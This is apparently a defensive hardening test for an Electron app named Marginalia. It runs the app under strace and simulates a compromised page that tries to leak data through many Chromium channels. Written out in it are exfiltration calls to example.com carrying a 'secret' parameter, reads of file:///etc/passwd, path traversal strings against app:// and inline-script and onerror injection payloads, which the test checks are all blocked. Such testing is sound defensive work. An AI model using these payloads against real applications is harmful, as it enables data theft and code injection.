// Réseau et Chromium, depuis l'intérieur : l'app réelle est lancée sous strace (tous ses processus), et
// une page compromise est simulée dans sa fenêtre. Elle tente de sortir par toutes les voies de Chromium
// (fetch, WebSocket, image, balise, WebRTC/STUN, préchargement DNS, cadre, fenêtre, navigation), de lire
// des fichiers (file://, remontée de dossier par app://), d'exécuter du code hors CSP et d'obtenir des
// permissions (caméra, position, USB, série, HID, Bluetooth, presse-papiers, notifications).
// Vérifie : chaque tentative échoue, ET aucun processus de l'app n'a ouvert de connexion hors de la
// machine (appels connect() et sendto() relevés par strace : TCP, UDP, DNS compris).
// Prérequis : npx vite build ; Xvfb ; strace. Lancer : xvfb-run -a node scripts/test-network-hardening.mjs
import { _electron as electron } from 'playwright-core';
import path from 'node:path';
import fs from 'node:fs';
import os from 'node:os';

const ROOT = path.resolve(path.dirname(new URL(import.meta.url).pathname), '..');
const ok = (c, m, extra = '') => {
  console.log((c ? 'OK   ' : 'ÉCHEC ') + m + (extra !== '' ? ' — ' + (typeof extra === 'string' ? extra : JSON.stringify(extra)) : ''));
  if (!c) process.exitCode = 1;
  return c;
};
const home = fs.mkdtempSync(path.join(os.tmpdir(), 'mg-net-'));
const trace = path.join(home, 'strace.log');
const wrapper = path.join(home, 'electron-strace.sh');
fs.writeFileSync(wrapper, `#!/bin/sh\nexec strace -f -qq -yy -e trace=connect,sendto,sendmsg,sendmmsg -o ${JSON.stringify(trace)} ${JSON.stringify(path.join(ROOT, 'node_modules/electron/dist/electron'))} "$@"\n`, { mode: 0o755 });

const app = await electron.launch({
  executablePath: wrapper,
  args: ['--no-sandbox', ...(process.env.MG_EXTRA_ARGS ? process.env.MG_EXTRA_ARGS.split('|') : []), ROOT],
  env: { ...process.env, HOME: home, XDG_CONFIG_HOME: home, MARGINALIA_E2E: '1', MARGINALIA_E2E_USER_DATA: path.join(home, 'donnees'), VITE_DEV_SERVER_URL: '' },
  timeout: 120000,
});
try {
  const page = await app.firstWindow();
  await page.waitForFunction(() => window.__store && window.__store.getState().ready, null, { timeout: 120000 });
  const v = await app.evaluate(() => ({ electron: process.versions.electron, chrome: process.versions.chrome }));
  console.log(`     Electron ${v.electron}, Chromium ${v.chrome}`);

  const prefs = await app.evaluate(({ BrowserWindow }) => {
    const w = BrowserWindow.getAllWindows()[0];
    const p = w.webContents.getLastWebPreferences();
    return { sandbox: p.sandbox, contextIsolation: p.contextIsolation, nodeIntegration: p.nodeIntegration, webSecurity: p.webSecurity, webviewTag: p.webviewTag, allowRunningInsecureContent: p.allowRunningInsecureContent, nodeIntegrationInWorker: p.nodeIntegrationInWorker, nodeIntegrationInSubFrames: p.nodeIntegrationInSubFrames, experimentalFeatures: p.experimentalFeatures };
  });
  ok(prefs.sandbox === true && prefs.contextIsolation === true && !prefs.nodeIntegration && prefs.webSecurity !== false && !prefs.webviewTag && !prefs.allowRunningInsecureContent && !prefs.nodeIntegrationInWorker && !prefs.nodeIntegrationInSubFrames && !prefs.experimentalFeatures, 'fenêtre : bac à sable, isolation du contexte, pas de Node, sécurité web active', prefs);

  // ── La page compromise ──
  const r = await page.evaluate(async () => {
    const out = {};
    const T = (p, ms = 4000) => Promise.race([p, new Promise((res) => setTimeout(() => res('délai'), ms))]);
    const tryIt = async (k, fn) => {
      try {
        out[k] = await T(fn());
      } catch (e) {
        out[k] = 'refusé: ' + String((e && e.name) || e).slice(0, 60);
      }
    };
    const EXT = 'example.com';
    await tryIt('fetchHttps', async () => (await fetch(`https://${EXT}/?d=secret`, { mode: 'no-cors' })).type);
    await tryIt('fetchHttp', async () => (await fetch(`http://${EXT}/?d=secret`, { mode: 'no-cors' })).type);
    await tryIt('fetchIp', async () => (await fetch('http://93.184.215.14/?d=secret', { mode: 'no-cors' })).type);
    await tryIt('websocket', () => new Promise((res) => { const w = new WebSocket(`wss://${EXT}/`); w.onopen = () => res('OUVERT'); w.onerror = () => res('refusé'); }));
    await tryIt('image', () => new Promise((res) => { const i = new Image(); i.onload = () => res('CHARGÉE'); i.onerror = () => res('refusé'); i.src = `https://${EXT}/p.png?d=secret`; }));
    await tryIt('beacon', async () => (navigator.sendBeacon(`https://${EXT}/b`, 'secret') ? 'accepté par l’API (voir strace)' : 'refusé'));
    await tryIt('script', () => new Promise((res) => { const s = document.createElement('script'); s.src = `https://${EXT}/x.js`; s.onload = () => res('CHARGÉ'); s.onerror = () => res('refusé'); document.head.appendChild(s); }));
    await tryIt('css', () => new Promise((res) => { const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = `https://${EXT}/x.css`; l.onload = () => res('CHARGÉ'); l.onerror = () => res('refusé'); document.head.appendChild(l); }));
    for (const rel of ['dns-prefetch', 'preconnect', 'prefetch']) { const l = document.createElement('link'); l.rel = rel; l.href = `https://${rel}.${EXT}/`; document.head.appendChild(l); }
    { const a = document.createElement('a'); a.href = `https://ancre.${EXT}/`; a.textContent = 'lien'; a.style.cssText = 'position:fixed;top:0;left:0;z-index:99999'; document.body.appendChild(a); a.dispatchEvent(new MouseEvent('mouseover', { bubbles: true })); }
    await tryIt('webrtc', () => new Promise((res) => {
      const cands = [];
      let pc;
      try { pc = new RTCPeerConnection({ iceServers: [{ urls: `stun:stun.${EXT}:3478` }, { urls: 'stun:93.184.215.14:3478' }] }); } catch (e) { return res('refusé: ' + e.name); }
      pc.createDataChannel('x');
      pc.onicecandidate = (e) => { if (e.candidate) cands.push(e.candidate.candidate); else res(cands); };
      pc.createOffer().then((o) => pc.setLocalDescription(o));
      setTimeout(() => res(cands), 3000);
    }));
    // Cadre vers un site : la page ne peut pas voir ce qu'il contient (autre origine) ; c'est le processus
    // principal qui le dira plus bas (page d'erreur de Chromium attendue, jamais le site).
    await new Promise((res) => { const f = document.createElement('iframe'); f.id = 'mg-probe-frame'; f.src = `https://${EXT}/`; f.onload = () => res(); document.body.appendChild(f); setTimeout(res, 2500); });
    await tryIt('windowOpen', async () => (window.open(`https://${EXT}/`) ? 'FENÊTRE' : 'refusé'));
    await tryIt('fileFetch', async () => 'LU ' + (await (await fetch('file:///etc/passwd')).text()).length);
    await tryIt('fileXhr', () => new Promise((res) => { const x = new XMLHttpRequest(); x.onload = () => res('LU ' + x.responseText.length); x.onerror = () => res('refusé'); x.open('GET', 'file:///etc/hostname'); x.send(); }));
    for (const p of ['../package.json', '..%2f..%2fpackage.json', '%2e%2e/%2e%2e/electron/main.cjs', '....//package.json', '/etc/passwd', '..\\..\\package.json'])
      await tryIt('traversal ' + p, async () => { const x = await fetch('app://marginalia/' + p); const t = await x.text(); return x.ok && /"name"\s*:\s*"marginalia"|root:|require\(/.test(t) ? 'LU' : 'refusé (' + x.status + ')'; });
    await tryIt('eval', async () => (0, eval)('"EXÉCUTÉ"'));
    await tryIt('newFunction', async () => new Function('return "EXÉCUTÉ"')());
    await tryIt('inlineScript', () => new Promise((res) => { window.__inl = null; const s = document.createElement('script'); s.textContent = 'window.__inl = "EXÉCUTÉ"'; document.head.appendChild(s); setTimeout(() => res(window.__inl || 'refusé'), 300); }));
    await tryIt('inlineHandler', () => new Promise((res) => { window.__h = null; const d = document.createElement('div'); d.innerHTML = '<img src="x" onerror="window.__h=\'EXÉCUTÉ\'">'; document.body.appendChild(d); setTimeout(() => res(window.__h || 'refusé'), 500); }));
    await tryIt('jsUrl', () => new Promise((res) => { window.__j = null; const a = document.createElement('a'); a.href = 'javascript:window.__j="EXÉCUTÉ"'; document.body.appendChild(a); a.click(); setTimeout(() => res(window.__j || 'refusé'), 300); }));
    await tryIt('dataWorker', () => new Promise((res) => { try { const w = new Worker('data:text/javascript,postMessage("EXÉCUTÉ")'); w.onmessage = (e) => res(e.data); w.onerror = () => res('refusé'); } catch (e) { res('refusé: ' + e.name); } }));
    await tryIt('serviceWorker', async () => { await navigator.serviceWorker.register('data:text/javascript,1'); return 'ENREGISTRÉ'; });
    out.nodeGlobals = [typeof window.require, typeof window.process, typeof window.module, typeof window.Buffer].join(',');
    await tryIt('camera', async () => { await navigator.mediaDevices.getUserMedia({ video: true }); return 'ACCORDÉ'; });
    await tryIt('micro', async () => { await navigator.mediaDevices.getUserMedia({ audio: true }); return 'ACCORDÉ'; });
    await tryIt('ecran', async () => { await navigator.mediaDevices.getDisplayMedia(); return 'ACCORDÉ'; });
    await tryIt('position', () => new Promise((res) => navigator.geolocation.getCurrentPosition(() => res('ACCORDÉ'), (e) => res('refusé: ' + e.code))));
    await tryIt('notification', async () => { const p = await Notification.requestPermission(); return p === 'granted' ? 'ACCORDÉ' : 'refusé'; });
    await tryIt('clipboardRead', async () => 'LU ' + (await navigator.clipboard.readText()).length);
    await tryIt('usb', async () => { await navigator.usb.requestDevice({ filters: [] }); return 'ACCORDÉ'; });
    await tryIt('serial', async () => { await navigator.serial.requestPort(); return 'ACCORDÉ'; });
    await tryIt('hid', async () => ((await navigator.hid.requestDevice({ filters: [] })).length ? 'ACCORDÉ' : 'refusé'));
    await tryIt('bluetooth', async () => { await navigator.bluetooth.requestDevice({ acceptAllDevices: true }); return 'ACCORDÉ'; });
    await tryIt('midi', async () => { await navigator.requestMIDIAccess({ sysex: true }); return 'ACCORDÉ'; });
    await tryIt('fsAccess', async () => { await window.showOpenFilePicker(); return 'OUVERT'; });
    return out;
  });
  const bad = /^(OUVERT|CHARGÉ|LU|EXÉCUTÉ|ACCORDÉ|FENÊTRE|ENREGISTRÉ|basic|opaque|cors)/;
  for (const [k, val] of Object.entries(r)) {
    if (k === 'webrtc' || k === 'nodeGlobals') continue;
    ok(!bad.test(String(val)), `${k} : ${String(val).slice(0, 70)}`);
  }
  ok(r.nodeGlobals === 'undefined,undefined,undefined,undefined', 'aucun accès à Node dans la page (require, process, module, Buffer)', r.nodeGlobals);
  const frames = await app.evaluate(async ({ BrowserWindow }) => {
    const w = BrowserWindow.getAllWindows()[0];
    const out = [];
    for (const f of w.webContents.mainFrame.frames) out.push(await f.executeJavaScript('location.href').catch((e) => 'erreur: ' + e.message));
    return out;
  });
  ok(frames.length > 0 && frames.every((u) => !/example\.com/.test(u) || /^chrome-error:/.test(u)) && frames.some((u) => /^chrome-error:/.test(u)), 'cadre vers un site : page d’erreur de Chromium, le site n’est pas chargé', frames);
  const cands = Array.isArray(r.webrtc) ? r.webrtc : [];
  ok(!cands.some((c) => / typ (srflx|relay|prflx) /.test(c)), 'WebRTC : aucun candidat obtenu d’un serveur STUN/TURN', Array.isArray(r.webrtc) ? cands.map((c) => c.split(' ').slice(4, 8).join(' ')) : r.webrtc);

  // Navigation de la fenêtre vers l'extérieur : refusée (la page reste celle de l'app).
  await page.evaluate(() => { location.href = 'https://example.com/?d=secret'; }).catch(() => {});
  await page.waitForTimeout(1500);
  ok(page.url().startsWith('app://marginalia/'), 'navigation de la fenêtre vers un site : refusée', page.url());
  const wins = await app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows().length);
  ok(wins === 1, 'aucune fenêtre supplémentaire ouverte', wins);
  await page.waitForTimeout(3000);
} finally {
  await app.close().catch(() => {});
}

// ── Ce que les processus de l'app ont vraiment tenté sur le réseau ──
await new Promise((res) => setTimeout(res, 1000));
const lines = fs.existsSync(trace) ? fs.readFileSync(trace, 'utf8').split('\n') : [];
const local = (ip) => /^(127\.|0\.0\.0\.0$|::1$|::$|::ffff:127\.)/.test(ip);
const addrOf = (l) => {
  const m4 = /sin_port=htons\((\d+)\), sin_addr=inet_addr\("([^"]+)"\)/.exec(l);
  const m6 = /sin6_port=htons\((\d+)\).*?inet_pton\(AF_INET6, "([^"]+)"/.exec(l);
  const m = m4 || m6;
  return m ? { ip: m[2], port: m[1] } : null;
};
// strace -yy annote chaque descripteur : « 22<UDP:[192.0.2.2:4242->8.8.8.8:53]> », « 30<TCP:[…]> ».
// TCP vers l'extérieur : fuite (le connect envoie déjà un paquet). UDP : un connect() seul n'envoie RIEN
// (Chromium s'en sert pour lire l'adresse locale de la route par défaut, vers 8.8.8.8:53) ; seul un
// envoi sur une socket dont le pair est extérieur, ou avec une adresse extérieure, est une fuite.
const out = new Map();
const probes = new Map();
const names = new Set();
let inetCalls = 0;
const leak = (k) => out.set(k, (out.get(k) || 0) + 1);
for (const l of lines) {
  let m;
  if ((m = /\bconnect\(\d+<([A-Zv6]+):/.exec(l))) {
    const a = addrOf(l);
    if (!a) continue;
    inetCalls++;
    if (local(a.ip)) continue;
    if (/^UDP/.test(m[1])) probes.set(`${a.ip}:${a.port}`, (probes.get(`${a.ip}:${a.port}`) || 0) + 1);
    else leak(`${m[1].toLowerCase()} ${a.ip}:${a.port}`);
    continue;
  }
  if (/\b(sendto|sendmsg|sendmmsg)\(/.test(l)) {
    if ((m = /\\f(dns-prefetch|preconnect|prefetch|ancre)\\7exampl/.exec(l))) names.add(m[1]);
    const a = addrOf(l);
    const peer = /\(\d+<(?:UDP|UDPv6|TCP|TCPv6):\[[^\]]*->\[?([0-9a-f.:]+?)\]?:(\d+)\]>/.exec(l);
    if (a) { inetCalls++; if (!local(a.ip)) leak(`envoi ${a.ip}:${a.port}`); }
    else if (peer) { inetCalls++; if (!local(peer[1])) leak(`envoi ${peer[1]}:${peer[2]}`); }
  }
}
ok([...probes.keys()].every((k) => !out.has(`envoi ${k}`)), `sondes de route UDP (connect sans aucun envoi) : ${[...probes.entries()].map(([k, n]) => `${k} ×${n}`).join(', ') || 'aucune'}`);
ok(names.size === 0, 'aucune requête DNS pour les noms glissés dans la page (dns-prefetch, preconnect, prefetch, lien)', [...names]);
ok(lines.length > 50, `strace : ${lines.length} appels réseau relevés (${inetCalls} vers des adresses IP, le reste : sockets locales du système)`);
ok(out.size === 0, 'aucune connexion ni envoi hors de la machine (TCP, UDP, DNS)', [...out.entries()]);
if (!process.env.KEEP_TRACE) fs.rmSync(home, { recursive: true, force: true });
else console.log('trace : ' + trace);
console.log(process.exitCode ? '\nDes vérifications ont échoué.' : '\nToutes les vérifications sont passées.');
